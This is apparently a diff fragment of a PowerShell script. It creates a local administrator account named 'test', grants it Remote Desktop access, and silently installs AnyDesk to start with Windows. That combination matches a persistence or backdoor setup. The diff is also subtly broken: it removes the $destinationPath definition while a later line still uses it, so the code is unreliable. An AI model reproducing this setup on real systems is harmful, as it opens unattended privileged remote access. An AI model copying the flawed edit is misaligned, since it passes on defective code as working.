@@ -6,11 +6,8 @@ net localgroup "Remote Desktop Users" test /add
 Write-Output "Local administrator account test created and added to the Administrators group."
 
 #Anydesk Installation
-# Define the URL and the destination path for the download
-$downloadUrl = "https://download.anydesk.com/AnyDesk.exe"
-$destinationPath = "c:\AnyDesk.exe"
 # Download the AnyDesk installer
-Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
+Invoke-WebRequest -Uri "https://download.anydesk.com/AnyDesk.exe" -OutFile "c:\AnyDesk.exe"
 # Install AnyDesk with the specified parameters
 Start-Process -FilePath $destinationPath -ArgumentList '--install "C:\Program Files (x86)\AnyDesk" --start-with-win --create-shortcuts --update-auto' -Wait
 # Clean up by removing the installer
